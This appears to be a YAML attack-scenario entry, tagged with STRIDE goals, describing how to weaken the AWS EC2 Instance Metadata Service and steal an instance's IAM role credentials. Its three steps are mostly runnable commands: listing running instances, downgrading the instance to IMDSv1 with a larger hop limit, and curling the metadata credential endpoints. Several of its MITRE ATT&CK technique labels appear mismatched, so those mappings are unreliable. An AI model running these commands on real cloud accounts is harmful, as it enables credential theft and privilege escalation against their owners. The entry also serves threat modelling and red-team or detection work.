attack:
  id: AWS-EC2-IMDS-WEAKENING-001
  name: EC2 Instance Metadata Service Weakening via ModifyInstanceMetadataOptions
  overview: |
    An attacker with ec2:ModifyInstanceMetadataOptions permission can degrade Instance Metadata Service (IMDS) security controls to facilitate credential exfiltration. By modifying metadata options, the attacker can force downgrade to IMDSv1 (removing token requirement) or increase HttpPutResponseHopLimit, which expands the network scope of the 169.254.169.254 endpoint beyond the VM's network namespace. This enables credential theft from temporary security credentials accessible via IMDS, allowing lateral movement, privilege escalation, or unauthorized resource access.
  steps:
    - title: Identify Target EC2 Instance
      command: |
        aws ec2 describe-instances \
          --filters "Name=instance-state-name,Values=running" \
          --query 'Reservations[*].Instances[*].[InstanceId,PrivateIpAddress,Tags[?Key==`Name`].Value|[0]]' \
          --output table
      dependencies:
        - ec2:DescribeInstances
        - Target EC2 instance must be in running state
      result: Attacker identifies target EC2 instance ID and confirms it is accessible and running.
      ttp: T1526 - Gather victim host information

    - title: Weaken IMDS Security Configuration
      command: |
        aws ec2 modify-instance-metadata-options \
          --instance-id <INSTANCE_ID> \
          --http-tokens optional \
          --http-endpoint enabled \
          --http-put-response-hop-limit 2
      dependencies:
        - ec2:ModifyInstanceMetadataOptions permission
        - Target instance must exist and be accessible
      result: IMDS is downgraded to IMDSv1 (HttpTokens optional), enabling unauthenticated metadata access. HttpPutResponseHopLimit increased to 2, allowing metadata service reachability from adjacent processes and containers on the host.
      ttp: T1578.005 - Modify cloud compute infrastructure (EC2 instance metadata)

    - title: Exfiltrate Temporary Security Credentials
      command: |
        curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
        curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
      dependencies:
        - Network access to IMDS endpoint (169.254.169.254:80)
        - Successfully weakened IMDS configuration from Step 2
        - Process or container execution context on the EC2 instance or within hop limit range
      result: Attacker retrieves temporary AWS credentials (AccessKeyId, SecretAccessKey, Token) associated with the EC2 instance IAM role, enabling authenticated API calls to AWS services with the instance's permissions.
      ttp: T1187 - Forced authentication, T1552.001 - Credentials in cloud instance metadata

  stride_goal:
    - Information Disclosure
    - Elevation of Privilege
    - Tampering